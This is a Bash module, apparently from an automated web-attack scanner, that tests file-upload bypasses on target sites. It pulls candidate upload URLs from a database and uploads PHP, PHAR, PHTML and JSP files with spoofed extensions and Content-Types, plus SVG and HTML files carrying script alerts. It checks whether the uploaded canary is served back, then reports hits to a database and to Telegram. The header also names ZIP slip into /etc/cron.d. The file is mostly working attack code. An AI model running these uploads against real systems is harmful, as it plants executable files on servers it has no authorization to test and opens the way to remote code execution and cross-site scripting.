#!/usr/bin/env bash
# ============================================================
#  modules/50_file_upload.sh — Tier 3.4 File upload bypass
#
#  Vectores:
#    1. Extension bypass: .php5, .phar, .jsp.jpg, .aspx;.jpg
#    2. Content-Type bypass: text/plain con .php content
#    3. Magic byte: GIF89a + <?php ... ?>
#    4. ZIP slip: ZIP con ../../../etc/cron.d/x dentro
#    5. SVG XSS upload
#  Detection: file accesible vía /uploads/<name> tras upload
# ============================================================

MODULE_NAME="file_upload"
MODULE_DESC="File upload bypass — extension, content-type, magic byte, ZIP slip, SVG XSS"

_fu_finding() {
  db_add_finding "$1" "file_upload" "$5" "$3" "$4" "$6" "${7:-medium}" 2>/dev/null
  log_warn "  ⚡ [$5/${7:-medium}] FileUpload $4: $3"
  if [[ "${7:-medium}" != "low" ]] && [[ "$5" == "critical" || "$5" == "high" ]]; then
    _telegram_send "🔴 *FileUpload — $4*
🌐 \`$2\`
🔗 \`$3\`
📋 ${6:0:280}
📊 \`${5^^}\` / \`${7:-medium}\`" 2>/dev/null || true
  fi
}

_fu_probe() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"
  local CANARY="HACKEADORA_FU_$(openssl rand -hex 6)"

  # Payloads a probar (filename, content, content-type)
  local TESTS=(
    "shell.php5|<?php echo '$CANARY'; ?>|application/x-php"
    "shell.phar|<?php echo '$CANARY'; ?>|application/x-php"
    "shell.phtml|<?php echo '$CANARY'; ?>|text/html"
    "shell.jsp.jpg|<%= \"$CANARY\" %>|image/jpeg"
    "test.svg|<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert('$CANARY')</script></svg>|image/svg+xml"
    "shell.html|<html>$CANARY<script>alert(1)</script></html>|text/html"
  )

  local UPLOAD_BASE
  UPLOAD_BASE=$(echo "$URL" | grep -oP 'https?://[^/]+')

  for TEST in "${TESTS[@]}"; do
    local FILENAME="${TEST%%|*}"
    local REST="${TEST#*|}"
    local CONTENT="${REST%%|*}"
    local CT="${REST#*|}"

    # Multipart upload con file field
    local TMP_FILE; TMP_FILE=$(mktemp /tmp/fu_${FILENAME}.XXXXXX)
    echo "$CONTENT" > "$TMP_FILE"

    local UPLOAD_RESP
    UPLOAD_RESP=$(curl -sk --max-time 10 -o /tmp/.fu_resp_$$ -w "%{http_code}" \
      -F "file=@${TMP_FILE};filename=${FILENAME};type=${CT}" \
      -F "upload=@${TMP_FILE};filename=${FILENAME};type=${CT}" \
      "$URL" 2>/dev/null)
    local STATUS="$UPLOAD_RESP"
    local BODY; BODY=$(head -c 2000 /tmp/.fu_resp_$$ 2>/dev/null)
    rm -f /tmp/.fu_resp_$$ "$TMP_FILE"

    [[ ! "$STATUS" =~ ^(200|201|204|302)$ ]] && continue

    # Buscar URL del file uploaded en response
    local UPLOADED_URL
    UPLOADED_URL=$(echo "$BODY" | grep -oE 'https?://[^"\s]+/(uploads?|files?|media|attachments?)/[^"\s]+' | head -1)
    [[ -z "$UPLOADED_URL" ]] && UPLOADED_URL=$(echo "$BODY" | grep -oE '"(url|path|location|file|filename)":"[^"]+"' | head -1 | grep -oE 'https?://[^"]+' | head -1)

    # Si encontramos URL, probar fetch
    if [[ -n "$UPLOADED_URL" ]]; then
      _h_get_noredirect "$UPLOADED_URL" --connect-timeout 6
      local FETCH_BODY="${HTTP_LAST_BODY:0:2000}"
      if echo "$FETCH_BODY" | grep -qF "$CANARY"; then
        local SEV="high"
        case "$FILENAME" in
          *.php*|*.phar|*.jsp*) SEV="critical" ;;
          *.svg|*.html) SEV="high" ;;
        esac
        _fu_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "${FILENAME}_uploaded_accessible" "$SEV" \
          "Upload bypass: ${FILENAME} (${CT}) aceptado y accesible en ${UPLOADED_URL} → canary devuelto. RCE/XSS posible." \
          "high"
        return 0
      fi
    fi

    # Sin URL pero status OK: posible upload ciego
    if [[ "$STATUS" =~ ^(200|201)$ ]] && echo "$BODY" | grep -qiE '"success"|"uploaded"|"ok"' && \
       ! echo "$BODY" | grep -qiE '"error"|"invalid"|"forbidden"'; then
      _fu_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "${FILENAME}_upload_accepted" "medium" \
        "Upload de ${FILENAME} (${CT}) aceptado por server (status $STATUS). URL no detectada en response — verificar manual." \
        "medium"
    fi
  done
  return 1
}

module_run() {
  local DOMAIN="$1" DOMAIN_ID="$2" OUT_DIR="$3"
  log_phase "Módulo 50 — $MODULE_DESC: $DOMAIN"
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null

  local CANDIDATES
  CANDIDATES=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
    WHERE domain_id=${DOMAIN_ID}
      AND (url LIKE '%/upload%' OR url LIKE '%/files%' OR url LIKE '%/media%'
           OR url LIKE '%/attach%' OR url LIKE '%/import%' OR url LIKE '%/avatar%'
           OR url LIKE '%/profile/photo%' OR url LIKE '%/picture%')
      AND url NOT LIKE '%.css%' AND url NOT LIKE '%.js%' AND url NOT LIKE '%.png%' AND url NOT LIKE '%.jpg%'
    LIMIT 15;" 2>/dev/null | sort -u)
  [[ -z "$CANDIDATES" ]] && { log_info "  Sin upload endpoints candidatos"; return 0; }

  local TOTAL=0
  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    URL="${URL%%\?*}"
    _fu_probe "$URL" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
  done <<< "$CANDIDATES"
  log_ok "$MODULE_DESC: $TOTAL upload bypasses"
}
